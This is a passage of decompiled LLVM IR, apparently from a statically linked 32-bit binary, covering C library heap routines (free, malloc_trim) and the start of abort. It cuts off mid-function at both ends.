  %v2_804abca = add i32 %v4_804abc5, 12
  %v3_804abca = inttoptr i32 %v2_804abca to i32*
  store i32 %v4_804abc5, i32* %v3_804abca, align 4
  %v0_804abcd = load i32, i32* %eax.global-to-local, align 4
  %v2_804abcd = add i32 %v0_804abcd, 8
  %v3_804abcd = inttoptr i32 %v2_804abcd to i32*
  store i32 %v0_804abcd, i32* %v3_804abcd, align 4
  %v0_804abd0.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804abd3 = icmp sgt i32 %v0_804abd0.pre, 95
  br i1 %v7_804abd3, label %dec_label_pc_804abd5, label %dec_label_pc_804abc1

dec_label_pc_804abd5:                             ; preds = %dec_label_pc_804abc1
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804abd9 = add i32 %tmp11, 864
  %v2_804abd9 = inttoptr i32 %v1_804abd9 to i32*
  %v3_804abd9 = load i32, i32* %v2_804abd9, align 4
  %v4_804abd9 = or i32 %v3_804abd9, 1
  store i32 %v4_804abd9, i32* %v2_804abd9, align 4
  %v0_804abe0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804abe0 = add i32 %v0_804abe0, 840
  %v2_804abe0 = inttoptr i32 %v1_804abe0 to i32*
  store i32 0, i32* %v2_804abe0, align 4
  %v0_804abea = load i32, i32* %eax.global-to-local, align 4
  %v1_804abea = add i32 %v0_804abea, 852
  %v2_804abea = inttoptr i32 %v1_804abea to i32*
  store i32 65536, i32* %v2_804abea, align 4
  %v0_804abf4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804abf4 = add i32 %v0_804abf4, 844
  %v2_804abf4 = inttoptr i32 %v1_804abf4 to i32*
  store i32 262144, i32* %v2_804abf4, align 4
  %v0_804abfe = load i32, i32* %eax.global-to-local, align 4
  %v1_804abfe = add i32 %v0_804abfe, 836
  %v2_804abfe = inttoptr i32 %v1_804abfe to i32*
  store i32 262144, i32* %v2_804abfe, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804ac0f = load i32, i32* %arg1, align 4
  %v1_804ac11 = urem i32 %v2_804ac0f, 4
  %v1_804ac14 = or i32 %v1_804ac11, 72
  store i32 %v1_804ac14, i32* %arg1, align 4
  %v0_804ac19 = load i32, i32* @edx, align 4
  %v1_804ac1b = add i32 %v0_804ac19, 52
  store i32 %v1_804ac1b, i32* %eax.global-to-local, align 4
  %v2_804ac1e = add i32 %v0_804ac19, 44
  %v3_804ac1e = inttoptr i32 %v2_804ac1e to i32*
  store i32 %v1_804ac1b, i32* %v3_804ac1e, align 4
  %v1_804ac23 = call i32 @sysconf(i32 30)
  store i32 %v1_804ac23, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804ac2f = add i32 %tmp11, 860
  %v3_804ac2f = inttoptr i32 %v2_804ac2f to i32*
  store i32 %v1_804ac23, i32* %v3_804ac2f, align 4
  br label %dec_label_pc_804ac35

dec_label_pc_804ac35:                             ; preds = %dec_label_pc_804abad, %dec_label_pc_804abd5
  store i32 %v0_804aa98, i32* @ebx, align 4
  store i32 %v0_804aa97, i32* @esi, align 4
  store i32 %v0_804aa96, i32* @edi, align 4
  %v0_804ac3c = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ac3c

; uselistorder directives
  uselistorder i32 %v0_804abcd, { 1, 0 }
  uselistorder i32 %v0_804ab8c, { 1, 0 }
  uselistorder i32 %v1_804ab47, { 1, 0 }
  uselistorder i32 %v2_804ab40, { 1, 0 }
  uselistorder i32 %v1_804ab38, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ab44, { 1, 0 }
  uselistorder i32 %v3_804aaf3, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804ab10, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804aaed, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804ab9e, { 1, 0 }
  uselistorder i32 %v1_804aab8, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804ac35, { 1, 0 }
  uselistorder label %dec_label_pc_804abc1, { 1, 0 }
  uselistorder label %dec_label_pc_804aba1, { 1, 0 }
  uselistorder label %dec_label_pc_804ab6d, { 1, 0 }
  uselistorder label %dec_label_pc_804ab65, { 1, 0 }
  uselistorder label %dec_label_pc_804ab30, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804ac3d = load i32, i32* @ebp, align 4
  %v0_804ac3e = load i32, i32* @edi, align 4
  %v0_804ac3f = load i32, i32* @esi, align 4
  %v0_804ac40 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804ac48 = icmp eq i32 %arg1, 0
  br i1 %v1_804ac48, label %dec_label_pc_804add1, label %dec_label_pc_804ac50

dec_label_pc_804ac50:                             ; preds = %entry
  %v2_804ac5b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ac5b, i32* @eax, align 4
  %v2_804ac60 = call i32 @__pthread_return_void(i32 %v2_804ac5b, i32 134526403)
  store i32 %v2_804ac60, i32* %eax.global-to-local, align 4
  %v1_804ac6c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052044.36 to i32))
  %v1_804ac71 = add i32 %arg1, -8
  store i32 %v1_804ac71, i32* @ecx, align 4
  %v0_804ac74 = load i8, i8* @global_var_8054600.37, align 1
  %v1_804ac74 = sext i8 %v0_804ac74 to i32
  store i32 %v1_804ac74, i32* %eax.global-to-local, align 4
  %v1_804ac7c = add i32 %arg1, -4
  %v2_804ac7c = inttoptr i32 %v1_804ac7c to i32*
  %v3_804ac7c = load i32, i32* %v2_804ac7c, align 4
  %v1_804ac81 = and i32 %v3_804ac7c, -4
  %v4_804ac81 = trunc i32 %v1_804ac81 to i8
  store i32 %v1_804ac81, i32* @ebx, align 4
  %v8_804ac86 = icmp ugt i8 %v4_804ac81, %v0_804ac74
  br i1 %v8_804ac86, label %dec_label_pc_804aca8, label %dec_label_pc_804ac88

dec_label_pc_804ac88:                             ; preds = %dec_label_pc_804ac50
  %v2_804ac88 = udiv i32 %v3_804ac7c, 8
  %v1_804ac8b = or i32 %v1_804ac74, 3
  %v3_804ac8b = trunc i32 %v1_804ac8b to i8
  store i32 %v1_804ac8b, i32* %eax.global-to-local, align 4
  store i8 %v3_804ac8b, i8* @global_var_8054600.37, align 512
  %v1_804ac93 = mul nuw i32 %v2_804ac88, 4
  %v2_804ac93 = add i32 %v1_804ac93, ptrtoint (i8* @global_var_8054600.37 to i32)
  store i32 %v2_804ac93, i32* @edx, align 4
  %v1_804ac9a = add i32 %v1_804ac93, add (i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32 -4)
  %v2_804ac9a = inttoptr i32 %v1_804ac9a to i32*
  %v3_804ac9a = load i32, i32* %v2_804ac9a, align 4
  store i32 %v3_804ac9a, i32* %eax.global-to-local, align 4
  %v3_804ac9d = inttoptr i32 %arg1 to i32*
  store i32 %v3_804ac9a, i32* %v3_804ac9d, align 4
  %v0_804aca0 = load i32, i32* @ecx, align 4
  %v1_804aca0 = load i32, i32* @edx, align 4
  %v2_804aca0 = add i32 %v1_804aca0, -4
  %v3_804aca0 = inttoptr i32 %v2_804aca0 to i32*
  store i32 %v0_804aca0, i32* %v3_804aca0, align 4
  br label %dec_label_pc_804adc0

dec_label_pc_804aca8:                             ; preds = %dec_label_pc_804ac50
  %v1_804aca8 = trunc i32 %v3_804ac7c to i8
  %v2_804aca8 = and i8 %v1_804aca8, 2
  %v3_804aca8 = icmp eq i8 %v2_804aca8, 0
  %v5_804aca8 = zext i8 %v2_804aca8 to i32
  %v7_804aca8 = and i32 %v3_804ac7c, -256
  %v8_804aca8 = or i32 %v5_804aca8, %v7_804aca8
  store i32 %v8_804aca8, i32* @edx, align 4
  %v1_804acab = icmp eq i1 %v3_804aca8, false
  br i1 %v1_804acab, label %dec_label_pc_804ada0, label %dec_label_pc_804acb1

dec_label_pc_804acb1:                             ; preds = %dec_label_pc_804aca8
  %v1_804acb1 = or i32 %v1_804ac74, 1
  %v3_804acb1 = trunc i32 %v1_804acb1 to i8
  store i32 %v1_804acb1, i32* %eax.global-to-local, align 4
  %v2_804acb4 = add i32 %v1_804ac81, %v1_804ac71
  store i32 %v2_804acb4, i32* @esi, align 4
  store i8 %v3_804acb1, i8* @global_var_8054600.37, align 512
  %v1_804acbc = add i32 %v2_804acb4, 4
  %v2_804acbc = inttoptr i32 %v1_804acbc to i32*
  %v3_804acbc = load i32, i32* %v2_804acbc, align 4
  store i32 %v3_804acbc, i32* %eax.global-to-local, align 4
  %v2_804acc3 = inttoptr i32 %v1_804ac7c to i8*
  %v3_804acc3 = load i8, i8* %v2_804acc3, align 1
  %v4_804acc3 = urem i8 %v3_804acc3, 2
  %v5_804acc3 = icmp eq i8 %v4_804acc3, 0
  %v1_804acc7 = icmp eq i1 %v5_804acc3, false
  br i1 %v1_804acc7, label %dec_label_pc_804acea, label %dec_label_pc_804acc9

dec_label_pc_804acc9:                             ; preds = %dec_label_pc_804acb1
  %v2_804acc9 = inttoptr i32 %v1_804ac71 to i32*
  %v3_804acc9 = load i32, i32* %v2_804acc9, align 4
  store i32 %v3_804acc9, i32* @ebp, align 4
  %v2_804acce = sub i32 %v1_804ac71, %v3_804acc9
  store i32 %v2_804acce, i32* %eax.global-to-local, align 4
  %v1_804acd0 = add i32 %v2_804acce, 8
  %v2_804acd0 = inttoptr i32 %v1_804acd0 to i32*
  %v3_804acd0 = load i32, i32* %v2_804acd0, align 4
  store i32 %v3_804acd0, i32* @edi, align 4
  %v1_804acd3 = add i32 %v2_804acce, 12
  %v2_804acd3 = inttoptr i32 %v1_804acd3 to i32*
  %v3_804acd3 = load i32, i32* %v2_804acd3, align 4
  store i32 %v3_804acd3, i32* @edx, align 4
  %v1_804acd6 = add i32 %v3_804acd0, 12
  %v2_804acd6 = inttoptr i32 %v1_804acd6 to i32*
  %v3_804acd6 = load i32, i32* %v2_804acd6, align 4
  store i32 %v3_804acd6, i32* @ecx, align 4
  %v12_804acd9 = icmp eq i32 %v3_804acd6, %v2_804acce
  %v1_804acdb = icmp eq i1 %v12_804acd9, false
  br i1 %v1_804acdb, label %dec_label_pc_804ad19, label %dec_label_pc_804acdd

dec_label_pc_804acdd:                             ; preds = %dec_label_pc_804acc9
  %v1_804acdd = add i32 %v3_804acd3, 8
  %v2_804acdd = inttoptr i32 %v1_804acdd to i32*
  %v3_804acdd = load i32, i32* %v2_804acdd, align 4
  %v15_804acdd = icmp eq i32 %v3_804acdd, %v3_804acd6
  %v1_804ace0 = icmp eq i1 %v15_804acdd, false
  br i1 %v1_804ace0, label %dec_label_pc_804ad19, label %dec_label_pc_804ace2

dec_label_pc_804ace2:                             ; preds = %dec_label_pc_804acdd
  %v2_804ace2 = add i32 %v3_804acc9, %v1_804ac81
  store i32 %v2_804ace2, i32* @ebx, align 4
  store i32 %v3_804acd3, i32* %v2_804acd6, align 4
  %v0_804ace7 = load i32, i32* @edi, align 4
  %v1_804ace7 = load i32, i32* @edx, align 4
  %v2_804ace7 = add i32 %v1_804ace7, 8
  %v3_804ace7 = inttoptr i32 %v2_804ace7 to i32*
  store i32 %v0_804ace7, i32* %v3_804ace7, align 4
  %v0_804acf1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804acea

dec_label_pc_804acea:                             ; preds = %dec_label_pc_804acb1, %dec_label_pc_804ace2
  %v1_804acfd = phi i32 [ %v2_804acb4, %dec_label_pc_804acb1 ], [ %v0_804acf1.pre, %dec_label_pc_804ace2 ]
  %v1_804acee = and i32 %v3_804acbc, -4
  store i32 %v1_804acee, i32* @ebp, align 4
  %v1_804acf1 = load i32, i32* @global_var_805462c.38, align 4
  %v12_804acf1 = icmp eq i32 %v1_804acfd, %v1_804acf1
  br i1 %v12_804acf1, label %dec_label_pc_804ad4b, label %dec_label_pc_804acf9

dec_label_pc_804acf9:                             ; preds = %dec_label_pc_804acea
  %v2_804acf9 = add i32 %v1_804acfd, 4
  %v3_804acf9 = add i32 %v2_804acf9, %v1_804acee
  %v4_804acf9 = inttoptr i32 %v3_804acf9 to i32*
  %v5_804acf9 = load i32, i32* %v4_804acf9, align 4
  store i32 %v5_804acf9, i32* %eax.global-to-local, align 4
  %v3_804acfd = inttoptr i32 %v2_804acf9 to i32*
  store i32 %v1_804acee, i32* %v3_804acfd, align 4
  %v0_804ad00 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad00 = urem i32 %v0_804ad00, 2
  %v2_804ad00 = icmp eq i32 %v1_804ad00, 0
  store i32 %v1_804ad00, i32* %eax.global-to-local, align 4
  %v1_804ad05 = icmp eq i1 %v2_804ad00, false
  br i1 %v1_804ad05, label %dec_label_pc_804ad26, label %dec_label_pc_804ad07

dec_label_pc_804ad07:                             ; preds = %dec_label_pc_804acf9
  %v0_804ad07 = load i32, i32* @esi, align 4
  %v1_804ad07 = add i32 %v0_804ad07, 8
  %v2_804ad07 = inttoptr i32 %v1_804ad07 to i32*
  %v3_804ad07 = load i32, i32* %v2_804ad07, align 4
  store i32 %v3_804ad07, i32* @edx, align 4
  %v1_804ad0a = add i32 %v0_804ad07, 12
  %v2_804ad0a = inttoptr i32 %v1_804ad0a to i32*
  %v3_804ad0a = load i32, i32* %v2_804ad0a, align 4
  store i32 %v3_804ad0a, i32* %eax.global-to-local, align 4
  %v1_804ad0d = add i32 %v3_804ad07, 12
  %v2_804ad0d = inttoptr i32 %v1_804ad0d to i32*
  %v3_804ad0d = load i32, i32* %v2_804ad0d, align 4
  store i32 %v3_804ad0d, i32* @edi, align 4
  %v12_804ad10 = icmp eq i32 %v3_804ad0d, %v0_804ad07
  %v1_804ad12 = icmp eq i1 %v12_804ad10, false
  br i1 %v1_804ad12, label %dec_label_pc_804ad19, label %dec_label_pc_804ad14

dec_label_pc_804ad14:                             ; preds = %dec_label_pc_804ad07
  %v1_804ad14 = add i32 %v3_804ad0a, 8
  %v2_804ad14 = inttoptr i32 %v1_804ad14 to i32*
  %v3_804ad14 = load i32, i32* %v2_804ad14, align 4
  %v15_804ad14 = icmp eq i32 %v3_804ad14, %v3_804ad0d
  br i1 %v15_804ad14, label %dec_label_pc_804ad1e, label %dec_label_pc_804ad19

dec_label_pc_804ad19:                             ; preds = %dec_label_pc_804acdd, %dec_label_pc_804acc9, %dec_label_pc_804ad14, %dec_label_pc_804ad07
  %v0_804ad19 = call i32 @abort()
  store i32 %v0_804ad19, i32* %eax.global-to-local, align 4
  %v1_804ad1e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ad1e

dec_label_pc_804ad1e:                             ; preds = %dec_label_pc_804ad14, %dec_label_pc_804ad19
  %v1_804ad1e = phi i32 [ %v3_804ad07, %dec_label_pc_804ad14 ], [ %v1_804ad1e.pre, %dec_label_pc_804ad19 ]
  %v0_804ad1e = phi i32 [ %v3_804ad0a, %dec_label_pc_804ad14 ], [ %v0_804ad19, %dec_label_pc_804ad19 ]
  %v2_804ad1e = add i32 %v1_804ad1e, 12
  %v3_804ad1e = inttoptr i32 %v2_804ad1e to i32*
  store i32 %v0_804ad1e, i32* %v3_804ad1e, align 4
  %v0_804ad21 = load i32, i32* @edx, align 4
  %v1_804ad21 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ad21 = add i32 %v1_804ad21, 8
  %v3_804ad21 = inttoptr i32 %v2_804ad21 to i32*
  store i32 %v0_804ad21, i32* %v3_804ad21, align 4
  %v0_804ad24 = load i32, i32* @ebx, align 4
  %v1_804ad24 = load i32, i32* @ebp, align 4
  %v2_804ad24 = add i32 %v1_804ad24, %v0_804ad24
  store i32 %v2_804ad24, i32* @ebx, align 4
  br label %dec_label_pc_804ad26

dec_label_pc_804ad26:                             ; preds = %dec_label_pc_804acf9, %dec_label_pc_804ad1e
  %v0_804ad26 = load i32, i32* @global_var_805463c.56, align 4
  store i32 %v0_804ad26, i32* %eax.global-to-local, align 4
  %v0_804ad2b = load i32, i32* @ecx, align 4
  %v1_804ad2b = add i32 %v0_804ad2b, 12
  %v2_804ad2b = inttoptr i32 %v1_804ad2b to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804ad2b, align 4
  %v0_804ad32 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad32 = load i32, i32* @ecx, align 4
  %v2_804ad32 = add i32 %v1_804ad32, 8
  %v3_804ad32 = inttoptr i32 %v2_804ad32 to i32*
  store i32 %v0_804ad32, i32* %v3_804ad32, align 4
  %v0_804ad35 = load i32, i32* @ebx, align 4
  %v1_804ad35 = load i32, i32* @ecx, align 4
  %v3_804ad35 = add i32 %v1_804ad35, %v0_804ad35
  %v4_804ad35 = inttoptr i32 %v3_804ad35 to i32*
  store i32 %v0_804ad35, i32* %v4_804ad35, align 4
  %v0_804ad38 = load i32, i32* @ecx, align 4
  %v1_804ad38 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ad38 = add i32 %v1_804ad38, 12
  %v3_804ad38 = inttoptr i32 %v2_804ad38 to i32*
  store i32 %v0_804ad38, i32* %v3_804ad38, align 4
  %v0_804ad3b = load i32, i32* @ebx, align 4
  %v1_804ad3d = or i32 %v0_804ad3b, 1
  store i32 %v1_804ad3d, i32* %eax.global-to-local, align 4
  %v0_804ad40 = load i32, i32* @ecx, align 4
  store i32 %v0_804ad40, i32* @global_var_805463c.56, align 4
  %v2_804ad46 = add i32 %v0_804ad40, 4
  %v3_804ad46 = inttoptr i32 %v2_804ad46 to i32*
  store i32 %v1_804ad3d, i32* %v3_804ad46, align 4
  br label %dec_label_pc_804ad5b

dec_label_pc_804ad4b:                             ; preds = %dec_label_pc_804acea
  %v0_804ad4b = load i32, i32* @ebx, align 4
  %v2_804ad4b = add i32 %v0_804ad4b, %v1_804acee
  store i32 %v2_804ad4b, i32* @ebx, align 4
  %v1_804ad4f = or i32 %v2_804ad4b, 1
  store i32 %v1_804ad4f, i32* %eax.global-to-local, align 4
  %v1_804ad52 = load i32, i32* @ecx, align 4
  %v2_804ad52 = add i32 %v1_804ad52, 4
  %v3_804ad52 = inttoptr i32 %v2_804ad52 to i32*
  store i32 %v1_804ad4f, i32* %v3_804ad52, align 4
  %v0_804ad55 = load i32, i32* @ecx, align 4
  store i32 %v0_804ad55, i32* @global_var_805462c.38, align 4
  br label %dec_label_pc_804ad5b

dec_label_pc_804ad5b:                             ; preds = %dec_label_pc_804ad26, %dec_label_pc_804ad4b
  %v0_804ad5b = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_804ad5b, 131072
  br i1 %tmp21, label %dec_label_pc_804adc0, label %dec_label_pc_804ad63

dec_label_pc_804ad63:                             ; preds = %dec_label_pc_804ad5b
  %v0_804ad63 = load i8, i8* @global_var_8054600.37, align 512
  %v1_804ad63 = and i8 %v0_804ad63, 2
  %v2_804ad63 = icmp eq i8 %v1_804ad63, 0
  br i1 %v2_804ad63, label %dec_label_pc_804ad7c, label %dec_label_pc_804ad6c

dec_label_pc_804ad6c:                             ; preds = %dec_label_pc_804ad63
  %v2_804ad74 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8054600.37 to i32*))
  store i32 %v2_804ad74, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ad7c

dec_label_pc_804ad7c:                             ; preds = %dec_label_pc_804ad63, %dec_label_pc_804ad6c
  %v0_804ad7c = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804ad7c, i32* %eax.global-to-local, align 4
  %v1_804ad81 = add i32 %v0_804ad7c, 4
  %v2_804ad81 = inttoptr i32 %v1_804ad81 to i32*
  %v3_804ad81 = load i32, i32* %v2_804ad81, align 4
  %v1_804ad84 = and i32 %v3_804ad81, -4
  store i32 %v1_804ad84, i32* %eax.global-to-local, align 4
  %v1_804ad87 = load i32, i32* @global_var_8054944.54, align 4
  %v7_804ad87 = icmp ult i32 %v1_804ad84, %v1_804ad87
  br i1 %v7_804ad87, label %dec_label_pc_804adc0, label %dec_label_pc_804ad8f

dec_label_pc_804ad8f:                             ; preds = %dec_label_pc_804ad7c
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @edx, align 4
  %v0_804ad94 = load i32, i32* @global_var_8054948.52, align 8
  store i32 %v0_804ad94, i32* @eax, align 4
  %v0_804ad99 = call i32 @__malloc_trim()
  store i32 %v0_804ad99, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804adc0

dec_label_pc_804ada0:                             ; preds = %dec_label_pc_804aca8
  %v2_804ada0 = inttoptr i32 %v1_804ac71 to i32*
  %v3_804ada0 = load i32, i32* %v2_804ada0, align 4
  %v0_804ada3 = load i32, i32* @global_var_8054950.45, align 16
  %v1_804ada3 = add i32 %v0_804ada3, -1
  store i32 %v1_804ada3, i32* @global_var_8054950.45, align 16
  %v2_804ada9 = add i32 %v3_804ada0, %v1_804ac81
  store i32 %v2_804ada9, i32* %eax.global-to-local, align 4
  %v2_804adac = sub i32 %v1_804ac71, %v3_804ada0
  %v0_804adb2 = load i32, i32* @global_var_8054964.48, align 4
  %v2_804adb2 = sub i32 %v0_804adb2, %v2_804ada9
  store i32 %v2_804adb2, i32* @global_var_8054964.48, align 4
  %v4_804adb8 = call i32 @munmap(i32 %v2_804adac, i32 %v2_804ada9, i32 %v1_804ac81, i32 %v1_804ac81)
  store i32 %v4_804adb8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804adc0

dec_label_pc_804adc0:                             ; preds = %dec_label_pc_804ad7c, %dec_label_pc_804ad5b, %dec_label_pc_804ad8f, %dec_label_pc_804ac88, %dec_label_pc_804ada0
  store i32 %v2_804ac5b, i32* @eax, align 4
  %v2_804adc9 = call i32 @__pthread_return_void(i32 %v2_804ac5b, i32 1)
  store i32 %v2_804adc9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804add1

dec_label_pc_804add1:                             ; preds = %entry, %dec_label_pc_804adc0
  %.0 = phi i32 [ undef, %entry ], [ %v2_804adc9, %dec_label_pc_804adc0 ]
  store i32 %v0_804ac40, i32* @ebx, align 4
  store i32 %v0_804ac3f, i32* @esi, align 4
  store i32 %v0_804ac3e, i32* @edi, align 4
  store i32 %v0_804ac3d, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_804ada0, { 1, 0 }
  uselistorder i32 %v0_804ad35, { 1, 0 }
  uselistorder i32 %v1_804ad00, { 1, 0 }
  uselistorder i32 %v2_804acf9, { 1, 0 }
  uselistorder i32 %v1_804acee, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804acfd, { 1, 0 }
  uselistorder i32 %v1_804ac81, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_804ac7c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804ac71, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 12, 10, 11, 13, 14, 15, 16, 17, 18, 21, 22, 19, 20, 23, 24, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* bitcast (i8* @global_var_8054600.37 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8054634.40 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805462c.38, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_804add1, { 1, 0 }
  uselistorder label %dec_label_pc_804adc0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804ad7c, { 1, 0 }
  uselistorder label %dec_label_pc_804ad5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ad26, { 1, 0 }
  uselistorder label %dec_label_pc_804ad1e, { 1, 0 }
  uselistorder label %dec_label_pc_804ad19, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804acea, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804add9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804ade6 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8054600.37 to i8) to i32) to i32*))
  %v0_804adeb = load i32, i32* @ebx, align 4
  store i32 %v0_804adeb, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32* @edx, align 4
  store i32 %v0_804add9, i32* @ebx, align 4
  %v0_804adf6 = call i32 @__malloc_trim()
  ret i32 %v0_804adf6

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8054600.37 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 2, 1, 3, 4 }
  uselistorder i8* @global_var_8054600.37, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_804ae08 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  %v12_804ae12 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ae17

dec_label_pc_804ae17:                             ; preds = %dec_label_pc_804ae17.dec_label_pc_804ae17_crit_edge, %entry
  %v0_804ae17 = phi i32 [ %v12_804ae12, %entry ], [ %v0_804ae17.pre, %dec_label_pc_804ae17.dec_label_pc_804ae17_crit_edge ]
  %v1_804ae2222 = phi i32 [ 31, %entry ], [ %v1_804ae22, %dec_label_pc_804ae17.dec_label_pc_804ae17_crit_edge ]
  %v2_804ae17 = mul i32 %v1_804ae2222, 4
  %v3_804ae17 = add i32 %v2_804ae17, 152
  %v4_804ae17 = add i32 %v3_804ae17, %v0_804ae17
  %v5_804ae17 = inttoptr i32 %v4_804ae17 to i32*
  store i32 0, i32* %v5_804ae17, align 4
  %v0_804ae22.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae22 = add i32 %v0_804ae22.pre, -1
  %v9_804ae22 = icmp slt i32 %v1_804ae22, 0
  store i32 %v1_804ae22, i32* %eax.global-to-local, align 4
  %v1_804ae23 = icmp eq i1 %v9_804ae22, false
  br i1 %v1_804ae23, label %dec_label_pc_804ae17.dec_label_pc_804ae17_crit_edge, label %dec_label_pc_804ae25

dec_label_pc_804ae17.dec_label_pc_804ae17_crit_edge: ; preds = %dec_label_pc_804ae17
  %v0_804ae17.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ae17

dec_label_pc_804ae25:                             ; preds = %dec_label_pc_804ae17
  %v0_804ae25 = load i32, i32* @ebx, align 4
  %v2_804ae29 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_804ae29, i32* @ebx, align 4
  %v4_804ae31 = call i32 @__sigaddset(i32 %v2_804ae29, i32 6, i32 %v0_804ae25, i32 %v0_804ae25)
  store i32 %v4_804ae31, i32* %eax.global-to-local, align 4
  %v1_804ae39 = icmp eq i32 %v4_804ae31, 0
  %v1_804ae3b = icmp eq i1 %v1_804ae39, false
  br i1 %v1_804ae3b, label %dec_label_pc_804ae4b, label %dec_label_pc_804ae3d

dec_label_pc_804ae3d:                             ; preds = %dec_label_pc_804ae25
  %v0_804ae3d = load i32, i32* @ecx, align 4
  %v4_804ae43 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v5_804ae43 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v4_804ae43, i32 0, i32 %v0_804ae3d)
  store i32 %v5_804ae43, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ae4b

dec_label_pc_804ae4b:                             ; preds = %dec_label_pc_804ae25, %dec_label_pc_804ae3d
  %v2_804ae834 = phi i32 [ %v4_804ae31, %dec_label_pc_804ae25 ], [ %v5_804ae43, %dec_label_pc_804ae3d ]
  %v0_804ae4b = load i8, i8* @global_var_8052500.58, align 256
  %v1_804ae4b = icmp eq i8 %v0_804ae4b, 0
  %v1_804ae52 = icmp eq i1 %v1_804ae4b, false
  br i1 %v1_804ae52, label %dec_label_pc_804ae83, label %dec_label_pc_804ae54

dec_label_pc_804ae54:                             ; preds = %dec_label_pc_804ae4b
  store i8 1, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804ae5b

dec_label_pc_804ae5b:                             ; preds = %dec_label_pc_804aec2, %dec_label_pc_804ae54
  %v1_804ae63 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  store i32 %v1_804ae63, i32* %eax.global-to-local, align 4
  %v1_804ae6f = call i32 @__raise(i32 6)
  store i32 %v1_804ae6f, i32* %eax.global-to-local, align 4
  %v1_804ae7b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  store i32 %v1_804ae7b, i32* %eax.global-to-local, align 4
  %v0_804ae83.pre = load i8, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804ae83

dec_label_pc_804ae83:                             ; preds = %dec_label_pc_804ae4b, %dec_label_pc_804ae5b
